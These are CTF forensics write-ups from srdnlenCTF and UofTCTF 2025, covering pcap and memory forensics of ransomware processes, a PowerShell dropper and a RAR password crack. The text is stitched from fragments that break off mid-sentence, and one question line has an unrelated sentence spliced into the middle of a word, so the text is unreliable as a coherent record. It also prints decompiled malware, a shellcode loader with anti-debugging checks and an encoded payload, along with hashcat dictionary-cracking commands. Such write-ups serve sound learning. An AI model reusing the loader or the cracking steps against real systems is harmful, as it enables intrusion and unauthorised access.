data\n7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(2):   PE32+ executable (GUI) x86-64, for MS Windows, 7 sections\n7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(20):  data\n7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(25):  DOS executable (COM or COMBOOT 16-bit), maybe with interrupt 22h, start instruction 0xe9c6a696 d565249c\n7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(21):  data\n```\n\nThe file marked with (2) was identified as PE32+. Initially, I checked the packet number of this file in the Export Objects list, but it did not match. To locate the desired packet, I applied a filter as shown below and found the correct packet, which was near the packet number listed in Export Objects.\n\n![Filter](/images/posts/2025-srdnlenctf/executable.png)\n\n```Text\nWhich packet contains the header of an executable file?\n2137\nCorrect!\nTo which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. HTTP 1)\n```\n\nStep 2: Determining Flow ID\nTo identify the Flow ID, I followed the TCP stream of Packet 2137 and determined the corresponding Flow ID: TCP 40.\n\n```Text\nTo which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. HTTP 1)\nTCP 40\nCorrect!\nInto how many parts is the executable fragmented? Give the total number of files\n```\n\nStep 3: Fragmentation\nAfter saving the files locally, I found that the executable was fragmented into 29 parts (from 0 to 28).\n\n```Text\nInto how many parts is the executable fragmented? Give the total number of files\n29\nCorrect!\nWhat is the resource name accessed in the GET resource containing the executable file?. Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&A1=other%3d%3d)\n```\n\nStep 4: Resource Name\nSearching for the resource name in the packets revealed the following:\n\n```Text\nWhat is the resource name accessed in the GET resource containing the executable file?. Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&A1=other%3d%3d)\n/filestreamingservice/files/7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509?P1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d\nCorrect!\nWhat is the sha256 of the first part of the executable file?\n```\n\nStep 5: SHA256 Check\nThe SHA256 hash of the first part of the executable file (file (2)) was calculated as follows:\n\n```bash\n$ sha256sum 7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1/=1736543287/&P2/=404/&P3/=2/&P4/=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d/(2/) \nb56b0ee4af8f4395455ed4f83b2d25498444c939fcf77d49ec9ec83c68983e52  7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509%3fP1=1736543287&P2=404&P3=2&P4=A4bbVZMC2rLzoHuEoqkGyn%2bfjFNZYtKNVXsPbIbY5Amz3v4r%2bQitB5Uc%2fXCKOEvShr8HAJPOsSVdpx2t0DGgKQ%3d%3d(2)\n```\n\n```Text\nWhat is the sha256 of the first part of the executable file?\nb56b0ee4af8f4395455ed4f83b2d25498444c939fcf77d49ec9ec83c68983e52\nCorrect!\nTo which of the extracted files does it correspond? As done by Wireshark, use the enumeration starting from 0\n```\n\nStep 6 - Corresponding Extracted File Enumeration\nUsing the Wireshark export naming convention, the file corresponds to the index (2).\n\n```Text\nTo which of the extracted files does it correspond? As done by Wireshark, use the enumeration starting from 0\n2\nCorrect!\nWhat is the sha256sum of the reconstructed file?\n```\n\nStep 7 - SHA-256 of the Reconstructed File\n\nThis was the trickiest question. As usual, I first attempted to reconstruct the 7d9cd93c-1d5e-449b-9ad7-f1e8d6b90509 file using the pieces numbered (0) to (28). However, the reconstructed file did not match the full size specified in the packet, which was 176,870,976 bytes. This prompted me to explore other sources for the hash. It occurred to me that we had also received a piecehash file, which might be useful.\n\nThe content of the piecehash file was as follows:\n\n```JSON\n{\"MajorVersion\":1,\"MinorVersion\":0,\"HashOfHashes\":\"JvZyinMn7LiBqNeYmy7JPeu8Kn4chEzksqZUnwB2Pg4=\",\"ContentLength\":176870976,\"PieceSize\":1048576,\"Pieces\":[\"tWsO5K+PQ5VFXtT4Oy0lSYREyTn8931J7J7IPGiYPlI=\",\"VXw6j5l8k7XNgyfLxfWGKbogZJOn/H9QjwKf8rKKgu0=\",\"q2tg5LDXyy0r0B1aSW+cSfV73UedLIbMTQZ+V+UvlCs=\",\"....\n```\n\nThis file contained the HashOfHashes as well as 167 piece hashes. Since we already knew the size of the main file, which was also mentioned in this file, I hypothesized that the HashOfHashes could be the hash of the main file. I decoded the HashOfHashes and converted it to hexadecimal. Upon verification, it turned out to be the desired hash.\n\n```Text\nWhat is the sha256sum of the reconstJust follow the packet and you will get the answer for the above question and also for after one.ructed file?\n26F6728A7327ECB881A8D7989B2EC93DEBBC2A7E1C844CE4B2A6549F00763E0E\nCorrect!\nHow many downloaded chrome extensions are not corrupted?\n```\n\nStep 8 - Number of Non-Corrupted Chrome Extensions\nAmong the exported objects, six were Chrome extensions. Using the file command, I identified that one file did not display as a `Google Chrome extension, version 3`, indicating it was corrupted. Thus, five extensions were not corrupted.\n\n```Text\nHow many downloaded chrome extensions are not corrupted?\n5\nCorrect!\nWhich packet is related to cryptomining?\n```\n\nStep 9 - Packet Related to Cryptomining\nI applied the filter `frame contains \"cryptomin\"` in Wireshark and identified the relevant packet as:\n\n```Text\nWhich packet is related to cryptomining?\n290\nCorrect!\nTo which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. UDP 0)\n```\n\nStep 10 - Corresponding Flow for Cryptomining Packet\nFollowing the TCP stream of packet 290 revealed the flow ID:\n\n```\nTo which flow does it correspond? (PROTOCOLO FLOW_ID, e.g. UDP 0)\nhttp 8\nCorrect!\nWhat is the resource name? Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&A1=other%3d%3d)\n```\n\nStep 11 - Resource Name for Cryptomining\nThe resource name associated with the packet was:\n\n```Text\nWhat is the resource name? Give the complete name (e.g. /myfile/file1/this-is-the-file?A0=something&A1=other%3d%3d)\n/filestreamingservice/files/dfeb2940-49d3-4f29-8fd8-d984a787dc6e?P1=1736222766&P2=404&P3=2&P4=H1jtSvldNZpuTpd5fP9uKkWsRR%2f5pXzccLVud6a0mJoxofqoKB34dNqF4qXGEwhkbPhjKQoon413psf1XzNktA%3d%3d\nCorrect!\nGive the sha256 of the file related to cryptocurrency.\n```\n\nStep 12 - SHA-256 of the Cryptomining File\nTo verify the cryptomining file, I exported it using Wireshark's \"Export Objects\" feature and calculated its SHA-256 hash using the sha256sum command:\n\n```Text\nGive the sha256 of the file related to cryptocurrency.\n364dfe0f3c1ad2df13e7629e2a7188fae3881ddb83a46c1170112d8d3b5a73de\nCorrect!\nCongratulations!

`2240`.\n\n```Text\nWhat is the PID of the process found in the evtx analysis?\n2240\nCorrect!\nWhich IP does not compare in the given pcap file?\n```\n\nStep 2: Identifying the IP Not Found in the PCAP File\n\nTo answer this, I extracted all IPs from both the memory and PCAP file and identified the unique one:\n\n```yaml\nIPs in memory but not in PCAP:\n{'52.123.129.254', '104.208.16.90', '13.107.18.254', '20.54.37.73', \n'0.0.0.0', '102.133.96.237', '13.89.179.12', '204.79.197.222', \n'79.140.81.80', '13.107.42.16', '13.107.4.254', '127.0.0.1', \n'20.42.65.84', '13.107.42.254', '2.18.40.141', '150.171.31.254'}\n```\n\n`127.0.0.1` found to be the desired one.\n\n```Text\nWhich IP does not compare in the given pcap file?\n127.0.0.1\nCorrect!\nWhat is the name in the manifest of the chrome extension found in the pcap and not in the RAM?\n```\n\nStep 3: Identifying the Chrome Extension in PCAP but Not in RAM\n\nI first extracted all manifest.json files from Chrome extensions in RAM:\n\n```bash\n$ python3 vol.py -f capture_ram.elf windows.filescan | grep -i chrome\n.\n0xbd0c75f09cc0

.dat file you get is the manifest.json of the Chrome extension. Then, I went on checking the Chrome extension files we extracted from the PCAPng.\n\nAfter unzipping the Chrome extension file, you will find the manifest.json:\n\n```bash\n$ unzip '2ed1297e-f6c9-4355-aec4-433ea371b116%3fP1=1736221556&P2=404&P3=2&P4=Zn4z6sl51sScnVeur31nZxcyJTY5mx4dMJFWB25fpo6vQYirZGtNOe3OY4cWH5eTHVKrEWtal87QWFUtShW2hg%3d%3d'\n$ cat manifest.json \n{\n    \"description\":  \"AutofillCore data component\",\n    \"name\":  \"AutofillCore\",\n    \"version\":  \"4.0.1.10\"\n}\n```\n\nThe above chrome extension was not present in the RAM.\n\n```Text\nWhat is the name in the manifest of the chrome extension found in the pcap and not in the RAM?\nAutofillCore\nCorrect!\nGive the PID of the displayed suspicious processes (do not consider does already analysed, neither their sons). If more than one put a comma (e.g. 1, 2)\n```\n\nStep 4: Finding Suspicious Processes\n\nBy reviewing the pslist output, the suspicious processes found were MEMYUoYU.exe (PID 6444), ceIcEMkw.exe (PID 1236)\n\n```Text\nGive the PID of the displayed suspicious processes (do not consider does already analysed, neither their sons). If more than one put a comma (e.g. 1, 2)\n6444, 1236\nCorrect!\nWhat is the directory of the file related to process 6444? Give the complete path from the root directory to the extension. (e.g. C:\\path\\my\\process.extension)\n```\n\nStep 5: Finding the Directory of the Malicious Processes\n\nUsing filescan, I determined the file locations:\n\n```bash\n$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.filescan | grep -i \"MEMYUoYU.exe\"\n0xbd0c78960250 \\Users\\User\\kOIUsMQU\\MEMYUoYU.exe\n```\nLet's submit the output in the specified format:\n\n```Text\nWhat is the directory of the file related to process 6444? Give the complete path from the root directory to the extension. (e.g. C:\\path\\my\\process.extension)C:\\Users\\User\\kOIUsMQU\\MEMYUoYU.exe\nCorrect!\nWhat is the directory of the file related to process 1236? Give the complete path from the root directory to the extension. (e.g. C:\\path\\my\\process.extension)\n```\n\nStep 6: Finding the Directory of Another Malicious Process\n\nI am not sure why the author wanted us to repeat the same step again, but let's proceed.\n\n```Text\nWhat is the directory of the file related to process 1236? Give the complete path from the root directory to the extension. (e.g. C:\\path\\my\\process.extension)C:\\ProgramData\\hwQkYMwk\\ceIcEMkw.exe\nCorrect!\nWhat is the parent PID of the malicious processes?\n```\n\nStep 7: Identifying the Parent PID of Malicious Processes\n\nBy checking the PPID of these processes, I found:\nParent PID: 4680\n\n```Text\nWhat is the parent PID of the malicious processes?\n4680\nCorrect!\nHow many files have been encrypted?\n```\nStep 8: Finding the number of encrypted files\n\nTo determine this, I first searched for keywords like crypt in the windows.filescan output of Volatility but didn’t find any significant leads. Since malware was involved, I then tried the windows.malfind plugin, which revealed some useful information:\n\n```bash\n$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.malfind\nVolatility 3 Framework 2.12.0\nProgress:  100.00\t\tPDB scanning finished                        \nPID\tProcess\tStart VPN\tEnd VPN\tTag\tProtection\tCommitCharge\tPrivateMemory\tFile output\tNotes\tHexdump\tDisasm\n6444\tMEMYUoYU.exe\t0x5090000\t0x5090fff\tVadS\tPAGE_EXECUTE_READWRITE\t1\t1\tDisabled\tN/A\t\n6e 6f 74 65 70 61 64 2e 65 78 65 20 22 43 3a 5c notepad.exe \"C:\\\n50 72 6f 67 72 61 6d 44 61 74 61 5c 5a 63 67 55 ProgramData\\ZcgU\n2e 74 78 74 22 00 00 00 00 00 00 00 00 00 00 00 .txt\"...........\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n1236\tceIcEMkw.exe\t0x52c0000\t0x52c0fff\tVadS\tPAGE_EXECUTE_READWRITE\t1\t1\tDisabled\tN/A\t\n74 61 73 6b 6b 69 6c 6c 20 2f 46 49 20 22 55 53 taskkill /FI \"US\n45 52 4e 41 4d 45 20 65 71 20 55 73 65 72 22 20 ERNAME eq User\" \n2f 46 20 2f 49 4d 20 4d 45 4d 59 55 6f 59 55 2e /F /IM MEMYUoYU.\n65 78 65 00 00 00 00 00 00 00 00 00 00 00 00 00 exe.............\n\n1236\tceIcEMkw.exe\t0x52d0000\t0x52d0fff\tVadS\tPAGE_EXECUTE_READWRITE\t1\t1\tDisabled\tN/A\t\n74 61 73 6b 6b 69 6c 6c 20 2f 46 49 20 22 55 53 taskkill /FI \"US\n45 52 4e 41 4d 45 20 65 71 20 55 73 65 72 22 20 ERNAME eq User\" \n2f 46 20 2f 49 4d 20 63 65 49 63 45 4d 6b 77 2e /F /IM ceIcEMkw.\n65 78 65 00 00 00 00 00 00 00 00 00 00 00 00 00 exe.............\n\n1236\tceIcEMkw.exe\t0xaad0000\t0xab48fff\tVadS\tPAGE_EXECUTE_READWRITE\t121\t1\tDisabled\tN/A\t\nf4 00 00 00 55 6e 69 74 65 64 20 53 74 61 74 65 ....United State\n73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 s...............\n00 00 00 00 42 69 74 41 63 63 65 73 73 20 42 69 ....BitAccess Bi\n74 63 6f 69 6e 20 41 54 4d 20 6d 61 63 68 69 6e tcoin ATM machin\n\n1236\tceIcEMkw.exe\t0x9b0000\t0x9b0fff\tVadS\tPAGE_EXECUTE_READWRITE\t1\t1\tDisabled\tN/A\t\n47 45 54 20 2f 6d 61 70 73 2f 61 70 69 2f 73 74 GET /maps/api/st\n61 74 69 63 6d 61 70 3f 63 65 6e 74 65 72 3d 33 aticmap?center=3\n32 2e 33 33 35 39 37 35 35 30 2c 2d 31 31 31 2e 2.33597550,-111.\n30 34 34 31 30 31 31 30 26 7a 6f 6f 6d 3d 31 34 04410110&zoom=14\n```\n\nFollowing this, I searched for the file in filescan, retrieved the virtual address, and dumped the file using the windows.dumpfiles plugin. Upon checking its contents, I found a list of 288 encrypted files.\n\n```Text\nHow many files have been encrypted?\n288\nCorrect!\nGive the filename of the file containing the list of the files to be encrypted. (only the filename not the whole path).\n```\n\nStep 9: Identifying the filename containing the list\n\nI know it is ZcgU.txt\n\n```Text\nGive the filename of the file containing the list of the files to be encrypted. (only the filename not the whole path).\nZcgU.txt\nCorrect!\nWhich cryptocurrency is used?\n```\n\nStep 10: Finding the cryptocurrency\n\nThe malfind output above shows that Bitcoin was used.\n\n```Text\nWhich cryptocurrency is used?\nBitcoin\nCorrect!\nWhich GET request is not present in the pcap? Give the whole request (METHOD resource, e.g. POST /accessed/resource)\n```\n\nStep 11: Identifying the GET Request\n\nTo answer this, I searched for GET requests in the memory file. I compared them which were looking similar to those in the PCAP but found no match. However, I had also discovered a GET request during the malfind search, which turned out to be the missing one:\n\n```Text\nWhich GET request is not present in the pcap? Give the whole request (METHOD resource, e.g. POST /accessed/resource)\nGET /maps/api/staticmap?center=32.33597550,-111.04410110&zoom=14\nCorrect!\nWhy did you have to pay a fine?\n```\n\nStep 12: Finding the reason for the fine\n\nThe question was a bit confusing, so I explored various Volatility plugins. Eventually, I dumped the memory of the malware process MEMYUoYU.exe and searched for related strings:\n\n```bash\n$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.memmap --pid 6444 --dump\n\n$ strings -el pid.6444.dmp | grep -iC5  \"pay a fine\"\n```\n\nThis revealed the following text:\n\n```Text\nimits:P\nAll locationsQ\nFine Amount:R\n$Total Amount Paid:S\nD*Multiple transfers are permitted.\nBThere are two ways to pay a fine:\nUnauthorized or pirated software has been detected.

(e.g. €10,000)\n```\n\nStep 13: Findint the amount of fine\n\nFrom the extracted text, the fine amount is clearly stated as $250,000.\n\n```Text\nWhat is the amount of fine? (e.g. €10,000)\n$250,000\nCorrect!\nWhich forum is used to ask for BitCoin AMT?\n```\n\nStep 14: Searching for the forum\n\nSearching in PID 6444 didn't provide an answer, so I checked the memory dump of PID 1236. By analysing it with strings command, I can find some questions on reddit.com site.\n\n```Text\nWhich forum is used to ask for BitCoin AMT?\nreddit\nCorrect!\nWhat is the BitCoin address at charts01.bitcoincharts.com?\n```\n\nStep 15: Finding the BitCoin address\n\nTo find the address, I searched for charts01.bitcoincharts.com.\n\n```bash\n$ strings -el pid.1236.dmp | grep -iC5 \"charts01.bitcoincharts.com\"\n```\n\nI got the address as `1yQBzAaZx7FojqMmTtHPTfZ42T4t6Q1Uh`.\n\n```Text\nWhat is the BitCoin address at charts01.bitcoincharts.com?\n1yQBzAaZx7FojqMmTtHPTfZ42T4t6Q1Uh\nCorrect!\nFrom which directory does process 6444 come from? Give only the local path with directory name (NOT the absolute path, i.e. without Desktop, e.g. mydirectory)\n```\n\nStep 16: Identifying the directory\n\nIf I search with the help of strings and grep the `\\Desktop\\` , you can found multiple references to `\\Users\\User\\Desktop\\ch2\\` as shown below:\n\n```bash\n$ strings -el pid.6444.dmp | grep -i \"\\\\\\DESKTOP\" \nC:\\Users\\User\\Desktop\\ch2\\0002bdf0923262600d3ef66d1ec6b2396a434e6f7626a9d70241a5663ee2f736.exe\nC:\\Users\\User\\Desktop\\ch2\\\nC:\\Users\\User\\Desktop\\ch2\\\nC:\\Users\\User\\Desktop\\ch2\\\n.\n```\n\nSecondly I can also get the same directory with the help of windows.handles plugin, so the answer was ch2.\n\n```Text\nFrom which directory does process 6444 come from? Give only the local path with directory name (NOT the absolute path, i.e. without Desktop, e.g. mydirectory)\nch2\nCorrect!\nWhat is the filename of the process which executed the two malware with PID 4680? Give only the filename with extension (e.g. myfile.ext)\n```\n\nStep 17: Getting the filename of the process\n\nSince the above output had the executable with a long string name, which was also mentioned in the PID 1236 process, I checked that and it turned out to be the desired one.\n\n```Text\nWhat is the filename of the process which executed the two malware with PID 4680? Give only the filename with extension (e.g. myfile.ext)\n0002bdf0923262600d3ef66d1ec6b2396a434e6f7626a9d70241a5663ee2f736.exe\nCorrect!\nCongratulations!

These writeups cover the Miscellaneous, Web and Forensics challenges that I personally solved during the competition.\n\n## Forensics\n\n### Poof\n\n#### Challenge Description\n\nYet another pcap, no usb traffic in this one so I'm lost. Can you help me out? :)\n\nAuthor: 0x157\n\n#### Solution\n\nThis year, we only received one challenge from 0x157 because he was sick. We were given a poof.pcapng file for this challenge. My excitement from the previous pcap challenges, like Skat's challenge in IrisCTF '25, hadn’t worn off yet.\n\nThis challenge was solved by my teammate during the competition while I was working on another one. I attempted this challenge later.\n\nI began analyzing the pcapng file in Wireshark. First, I checked the Protocol Hierarchy Statistics, and this was the result:\n\n![Stats](/images/posts/2025-uoftctf/forensics/poof/stats.png)\n\nNext, I examined the TCP packets and found this packet, which contained a listing of the files:\n\n![List of the files](/images/posts/2025-uoftctf/forensics/poof/list.png)\n\nI proceeded to export all the files that were shared:\n\n![Export Objects](/images/posts/2025-uoftctf/forensics/poof/export_obj.png)\n\nOnly kcaswqcd.ps1 turned out to be useful, so I started analyzing it.\n\nWhat This Script Does:\n1. Variable and Object Creation:\n\n    The script dynamically creates variables using Set-Variable and Set-Item.\n    It utilizes PowerShell's -f string format operator to concatenate strings and obfuscate key values.\n\n2. Decryption Logic:\n\n    The script initializes cryptographic objects (e.g., AES decryption) and sets up parameters such as keys, initialization vectors (IVs), cipher mode, and padding.\n    It reads encrypted content and decrypts it using the specified cryptographic parameters.\n\n3. Memory Stream Operations:\n\n    The decrypted data is streamed through memory, likely preparing it for writing to a file.\n\n4. File Creation:\n\n    The decrypted content is written to an executable file (.exe) in a temporary directory.\n\n5. Execution:\n\n    The script invokes the newly created executable file using Start-Process.\n\nI extracted the useful part from the ps code:\n\n![Powershell](/images/posts/2025-uoftctf/forensics/poof/ps.png)\n\nFrom this, we obtained the CV, IV, and KEY. Let’s decrypt it on CyberChef as we already had 82nvdkandf.bin:\n\n![Cyberchef](/images/posts/2025-uoftctf/forensics/poof/cyberchef.png)\n\nAfter decrypting the file, I downloaded the PE file named poof.exe.\n\nI initially attempted to analyze it using IDA and Ghidra but was unsuccessful. Then, I tried using dnSpy, which allowed me to view the desired code.\n\n```C#\nImports System\nImports System.Diagnostics\nImports System.Runtime.CompilerServices\nImports System.Runtime.InteropServices\n\nNamespace Kljansdfkansdf\n\t' Token: 0x02000003 RID: 3\n\t<NullableContext(1)>\n\t<Nullable(0)>\n\tPublic Class Kljansdfkansdf\n\t\t' Token: 0x06000009 RID: 9 RVA: 0x00002080 File Offset: 0x00000280\n\t\tPublic Shared Sub kjfadsiewqinfqniowf(ncuasdhif As Byte())\n\t\t\tDim num As UInteger = Win32.VirtualAlloc(0UI, CUInt(ncuasdhif.Length), Win32.MEM_COMMIT, Win32.PAGE_READWRITE)\n\t\t\tMarshal.Copy(ncuasdhif, 0, CType(CType(num, UIntPtr), IntPtr), ncuasdhif.Length)\n\t\t\tDim num2 As UInteger\n\t\t\tWin32.VirtualProtect(CType(CType(num, UIntPtr), IntPtr), CType(CType(ncuasdhif.Length, IntPtr), UIntPtr), Win32.PAGE_EXECUTE_READ, num2)\n\t\t\tDim zero As IntPtr = IntPtr.Zero\n\t\t\tDim num3 As UInteger = 0UI\n\t\t\tDim zero2 As IntPtr = IntPtr.Zero\n\t\t\tWin32.WaitForSingleObject(Win32.CreateThread(0UI, 0UI, num, zero2, 0UI, num3), UInteger.MaxValue)\n\t\tEnd Sub\n\n\t\t' Token: 0x0600000A RID: 10 RVA: 0x000020E4 File Offset: 0x000002E4\n\t\tPrivate Shared Sub Main(args As String())\n\t\t\tWin32.ShowWindow(Win32.GetConsoleWindow(), Win32.SW_HIDE)\n\t\t\tIf Debugger.IsAttached Then\n\t\t\t\tEnvironment.[Exit](0)\n\t\t\tEnd If\n\t\t\tFor Each process As Process In Process.GetProcesses()\n\t\t\t\tIf process.ProcessName.Contains(\"devenv\") OrElse process.ProcessName.Contains(\"dnspy\") Then\n\t\t\t\t\tEnvironment.[Exit](0)\n\t\t\t\tEnd If\n\t\t\tNext\n\t\t\tDim array As Byte() = New Byte() { 129, 149, Byte.MaxValue, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 47, 113, 246, 47, 105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 28, 1, 127, 81, 93, 188, 178, 112, 124, 186, 159, 143, 47, 42, 246, 47, 109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246, 36, 93, 124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 209, 188, 178, 112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 8, 153, 37, 246, 37, 89, 124, 174, 27, 246, 113, 54, 246, 37, 97, 124, 174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36, 39, 44, 130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 125, 125, 125, 45, 21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 43, 21, 219, 232, 192, 224, 130, 168, 65, 123, 1, 119, 253, 134, 157, 8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93, 82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 14, 24, 15, 93, 8, 18, 27, 9, 30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17, 73, 19, 9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125 }\n\t\t\tDim b As Byte = 125\n\t\t\tFor j As Integer = 0 To array.Length -

Can you help me decrypt it?\n\nAuthor: SteakEnthusiast\n\n#### Solution\n\nIn this challenge, we received a password-protected RAR file using version 5.\n\nI examined the file's hex using the bvi hex editor and noticed that it contained flag.py and another file, flag.enc, stored as Alternate Data Streams (ADS), as shown below:\n\n![Hex Data](/images/posts/2025-uoftctf/forensics/dm/hex.png)\n\nAs expected, we needed to brute-force the password using Hashcat with a dictionary attack. To start, we needed the hash for the password of the file, so I used John the Ripper’s tool rar2john:\n\n```bash\n$ ./rar2john flag.rar > hash_rar.txt\n```\n\nFor brute-forcing with Hashcat, we need to remove everything before the colon in the output. The remaining content of hash_rar.txt was:\n\n```text\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8$d12d4ba211b9c642\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$7d06143b1a7dab3327b3ef1e41ad881a$8$d12d4ba211b9c642\n```\n\nSince flag.rar contained two files, we ended up with two hashes. Hashcat would first brute-force the first hash, and then proceed with the second one.\n\n```bash \n$ hashcat -m 13000 -a 0 -w 4 hash_rar.txt ~/Downloads/rockyou.txt \nhashcat (v6.2.6) starting\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => \n\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8$d12d4ba211b9c642:toronto416\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13000 (RAR5)\nHash.Target......: $rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234...b9c642\n.\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/home/g4rud4/Downloads/rockyou.txt)\n.\nProgress.........: 3119104/14344384 (21.74%)\nRejected.........: 0/3119104 (0.00%)\nRestore.Point....: 3117056/14344384 (21.73%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32768-32799\nCandidate.Engine.: Device Generator\nCandidates.#1....: torrisjames -> torit13\n.\n```\n\nIt took a considerable amount of time to brute-force the password since the author had set it at the 21.74% mark of the rockyou.txt file. The password turned out to be `toronto416`.\n\nInitially, I used unrar to extract the files, but it only retrieved flag.py and not flag.enc. To extract both files from the RAR archive, I switched to using 7z, which successfully extracted them.\n\n```bash\n./7z x flag.rar\n\n7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-28\n 64-bit locale=en_IN Threads:16 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 672 bytes (1 KiB)\n\nExtracting archive: flag.rar\n--\nPath = flag.rar\nType = Rar5\nPhysical Size = 672\nCharacteristics = Locator QuickOpen:0\nEncrypted = -\nSolid = -\nBlocks = 2\nMethod = v6:128K:m3\nMultivolume = -\nVolumes = 1\n    \nEnter password:toronto416\n\nEverything is Ok\n\nFiles: 1\nAlternate Streams: 1\nAlternate Streams Size: 57\nSize:       609\nCompressed: 672\n```\n\nContent of the flag.py:\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Hash import SHA256\nfrom time import time\nimport random\nrandom.seed(int(time()))\nKEY = SHA256.new(str(random.getrandbits(256)).encode()).digest()\nFLAG = \"uoftctf{fake_flag}\"\n\ndef encrypt_flag(flag, key):\n    cipher = AES.new(key, AES.MODE_EAX)\n    ciphertext, tag = cipher.encrypt_and_digest(flag.encode())\n    return cipher.nonce + ciphertext\n\ndef main():\n    encrypted_flag = encrypt_flag(FLAG, KEY)\n    with open(\"flag.enc\", \"wb\") as f:\n        f.write(encrypted_flag)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nNext, I created a decryption script to decrypt flag.enc and retrieve the flag:\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256\nimport random\nfrom datetime import datetime\n\ndef get_unix_timestamp(dt_str):\n    dt = datetime.strptime(dt_str, \"%Y:%m:%d %H:%M:%S%z\")\n    return int(dt.timestamp())\n\ndef try_decrypt(encrypted_data, timestamp):\n    random.seed(timestamp)\n    \n    key = SHA256.new(str(random.getrandbits(256)).encode()).digest()\n    \n    try:\n        nonce = encrypted_data[:16]\n        ciphertext = encrypted_data[16:]\n        \n        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n        decrypted = cipher.decrypt(ciphertext)\n        \n        return decrypted.decode('utf-8')\n    except Exception as e:\n        return None\n\ndef main():\n    target_time = \"2025:01:06 07:43:39+05:30\"\n    unix_timestamp = get_unix_timestamp(target_time)\n    \n    with open(\"flag.enc\", \"rb\") as f:\n        encrypted_flag = f.read()\n    \n    for offset in range(-60, 61):\n        test_timestamp = unix_timestamp + offset\n        result = try_decrypt(encrypted_flag, test_timestamp)\n        \n        if result and \"uoftctf{\" in result:\n            print(f\"Found flag at timestamp {test_timestamp}!\")\n            print(f\"Flag: {result}\")\n            return\n    \n    print(\"Flag not found in the tested time range\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nI ran the script and obtained the following output:\n\n```bash\n$ python3 dec.py \n\nFound flag at timestamp 1736129619!  \nFlag: uoftctf{ads_and_aes_are_one_letter_apart}\n```\n\nFinally, we got our flag.\n\nFlag:\n```yaml\nuoftctf{ads_and_aes_are_one_letter_apart}\n```\n\n## Miscellaneous\n\n### Surgery\n\n#### Challenge Description\n\nI was thinking of getting some facial contouring plastic surgery done, but didn't know who to go to. My friend said they had a recommendation for a doctor specializing in that, but only sent me this photo of some building. Who's the doctor?\nBefore submitting, wrap the doctor's name in `uoftctf{}`. Special characters allowed, [First] [Last] format.\n\nFor example, if the name was Jean-Pierre Brehier, the flag would be 